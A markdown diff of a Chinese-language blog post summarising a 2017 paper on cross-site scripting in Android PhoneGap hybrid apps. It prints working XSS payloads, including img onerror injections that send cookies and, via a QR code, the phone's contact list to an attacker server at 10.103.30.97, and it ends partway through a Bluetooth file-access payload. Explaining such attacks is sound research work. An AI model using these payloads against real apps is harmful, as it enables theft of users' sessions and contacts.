@@ -8,9 +8,7 @@ date: 2024-05-15
 
 # Cross-site Scripting Attacks on Android Hybrid Applications
 <!-- more -->
-:::info
 Bao, W., Yao, W., Zong, M., & Wang, D. (2017, March). Cross-site scripting attacks on android hybrid applications. In Proceedings of the 2017 International Conference on Cryptography, Security and Privacy (pp. 56-61).
-:::
 
 這一篇論文雖然很舊了，但還是蠻有趣的
 
@@ -40,32 +38,33 @@ Bao, W., Yao, W., Zong, M., & Wang, D. (2017, March). Cross-site scripting attac
 作者把malicious code插在簡單的comment management system中，這個App是PhoneGap Framework做的，而且有storage XSS漏洞。如果這個 App是基於native language的，那麼JavaScript code將永遠不會被執行。 但是，在此 PhoneGap  App中，如果 App使用任何易受攻擊的 API 來顯示評論，則程式碼將在 WebView 內執行。
 ![圖片1](https://hackmd.io/_uploads/SJ6ehb-mR.png)
 * 左邊的圖片:
-    ```javascript!
+    ```javascript
     <script>alert(document.cookie)</script>
     ```
     網頁沒有任何異常情況下，作者只使用"append()" API為網頁新增註解。 透過JQuery API顯示評論字段，然後同時觸發注入的程式碼。 顯然，"append()" API 並不安全。 "innerHTML" API 比"append()"更安全，並且不會運行"script"標籤內的程式碼，因此作者可以使用"innerHTML" API 來替換。
-* 中間的圖片:
-    這就是用替換成innerHTML的結果，會發現這次的攻擊就沒有成功
+* 中間的圖片: 這就是用替換成innerHTML的結果，會發現這次的攻擊就沒有成功
 * 右邊的圖片:
-    ```javascript!
+    ```javascript
     <img src=x onerror= "alert(document.cookie )">
     ```
     但我們還是可以改變payload，讓攻擊可以成功，也就是用上述提到的第二列payload，結果就會如最右邊的截圖
+
 ---
+
 當然我們也可以嘗試把得到的敏感資訊透過第三個payload傳出去給attacker，得到的response如下
-```javascript!
+```javascript
 <img src=x onerror= "new Image().src='http://10.103.30.97:80/cookies/attacker.php?cookie='%2bdocument.cookie">
 ```
 ![圖片](https://hackmd.io/_uploads/HJ9W2WZmC.png)
 Attacker's Server Receive:
-```!
+```
 http://10.103.30.97/cookies/manage.php?name=Admin&token=e3afed0047b08059d0fada10f400c1e5
 ```
 
 ### Steal Contact Data
 這次攻擊的標的是QRcode，我們可以把惡意的code嵌入在QRcode當中，如果有利用PhoneGap的App掃描到這個QRcode，因為他是在WebView中進行render，所以這個malicious code會被triggered，這個App使用的是`phonegap-plugin-barcodescanner`這個plugin，當程式碼顯示時，`img`的`onerror`事件將會被觸發，然後使用者的聯絡資料將會傳送給攻擊者。
 * Attack Pattern
-    ```javascript!
+    ```javascript
     <img src=x onerror=
         "navigator.contacts.find(['displayName','phoneNumbers'],
         function(c){
@@ -77,6 +76,7 @@ http://10.103.30.97/cookies/manage.php?name=Admin&token=e3afed0047b08059d0fada10
             alert(r);
         new Image().src='http://10.103.30.97/c.php?d='+r; })" >
     ```
+
 如果是用Native Language寫的App就會如左邊的圖片那樣只有顯示這個QRcode儲存的資訊，但如果是用PhoneGap寫的App，經過WebView render出來的結果，就會顯示手機的聯絡人資訊。他是用`navigator.contacts.find`這個API去呼叫PhoneGap的聯絡人plugin的Java code來搜尋使用者的聯絡人
 ![圖片2](https://hackmd.io/_uploads/B158hZWmR.png)
 
@@ -86,7 +86,7 @@ http://10.103.30.97/cookies/manage.php?name=Admin&token=e3afed0047b08059d0fada10
 
 為了demo攻擊的效果，作者使用`cordova-plugin-bluetooth-serial`插件和`cordova-plugin-file`插件開發了一個PhoneGap應用程式。藍牙裝置的名稱是透過`innerHTML`API顯示的，安全性不夠，攻擊者可以將藍牙裝置的名稱更改為惡意程式碼來實現攻擊。 並且與前兩種設計類似的是再次使用了`onerror`事件。
 * Attack Pattern
-    ```javascript!
+    ```javascript
     <img src=x onerror=
         "window.requestFileSystem(LocalFileSystem.PERSISTENT,0
         ,function(f){
